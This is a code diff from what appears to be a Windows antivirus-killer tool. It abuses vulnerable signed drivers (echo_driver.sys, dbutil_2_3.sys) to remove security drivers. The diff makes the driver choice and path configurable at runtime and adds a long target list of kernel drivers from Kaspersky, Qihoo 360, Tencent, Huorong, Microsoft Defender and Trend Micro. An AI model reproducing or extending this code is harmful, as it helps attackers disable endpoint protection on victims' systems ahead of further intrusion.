@@ -5,18 +5,26 @@
 #pragma comment(lib,"ntdll.lib")
 
 /*
-DriverType specifies different drivers
+Driver_Type specifies different drivers
 1 -> echo_driver.sys driver, supports win10+
 2 -> dbutil_2_3.sys driver, supports Win7+ (may not be loaded in higher versions such as win11)
 */
 
-#define DriverType 1
+INT Driver_Type = 0;
 
 //Specify the location of the driver
-#define DrivePath "C:\\ProgramData\\echo_driver.sys"
+CHAR* DrivePath = NULL;
 
 //Set the driver name to be cleared
 CONST CHAR* AVDriver[] = {
+	"klflt.sys","klhk.sys","klif.sys","klupd_KES-21-9_arkmon.sys","KLIF.KES-21-9.sys","klbackupflt.KES-21-9.sys",
+	"QaxNfDrv.sys","QKBaseChain64.sys","QKNetFilter.sys","QKSecureIO.sys","QesEngEx.sys","QkHelp64.sys","qmnetmonw64.sys",
+	"QMUdisk64_ev.sys","QQSysMonX64_EV.sys","TAOKernelEx64_ev.sys","TFsFltX64_ev.sys","TAOAcceleratorEx64_ev.sys","QQSysMonX64.sys","TFsFlt.sys",
+	"sysdiag_win10.sys","sysdiag.sys",
+	"360AvFlt.sys",
+	"360qpesv64.sys","360AntiSteal64.sys","360AntiSteal.sys","360qpesv.sys","360FsFlt.sys","360Box64.sys","360netmon.sys","360AntiHacker64.sys","360Hvm64.sys","360qpesv64.sys","360AntiHijack64.sys","360AntiExploit64.sys","DsArk64.sys","360Sensor64.sys","DsArk.sys", 
+	"WdFilter.sys","MpKslDrv.sys","mpsdrv.sys","WdNisDrv.sys","win32k.sys",
+	"TmPreFilter.sys","TmXPFlt.sys",
 	NULL
 };
 
